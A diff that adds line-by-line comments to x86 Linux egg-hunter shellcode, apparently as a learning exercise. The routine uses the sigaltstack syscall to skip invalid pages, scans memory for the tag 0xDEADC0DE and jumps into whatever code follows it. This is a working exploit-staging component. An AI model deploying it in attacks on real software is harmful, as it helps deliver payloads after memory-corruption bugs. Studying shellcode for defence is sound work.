@@ -7,24 +7,24 @@ global _start
 section .text
 
 _start:
-	cld
-	xor edx, edx
-	mov ebx, edx
+	cld			; clear direction flag
+	xor edx, edx		; set edx to 0
+	mov ebx, edx		; set ebx to 0
 
-nextpage:
-	or   bx, 0xfff
+nextpage:			; use pages of 4096 bytes (0x1000)
+	or   bx, 0xfff		; go to next page
 nextbyte:
-	inc  ebx
-	mov  eax, edx
-	mov  al, 0xBA
-	int  0x80
-	cmp  al, 0xf2
-	jz   nextpage
-	mov  eax, 0xDEC0ADDE
-	mov  edi, ebx
-	scasd
-	jnz  nextbyte
-	scasd
-	jnz  nextbyte
-	jmp  edi
+	inc  ebx		; go to next byte
+	mov  eax, edx		; clear eax
+	mov  al, 0xBA		; syscall number for sys_sigaltstack
+	int  0x80		; syscall
+	cmp  al, 0xf2		; check whether syscall return EFAULT
+	jz   nextpage		; if EFAULT, go to next page
+	mov  eax, 0xDEC0ADDE	; copy 0xDEADCODE to eax
+	mov  edi, ebx		; copy current location to edi
+	scasd			; compare edi to eax
+	jnz  nextbyte		; if not equal jump to next byte
+	scasd			; compare next 4 bytes to eax
+	jnz  nextbyte		; if not equal jump to next byte
+	jmp  edi		; else go to current shellcode
 
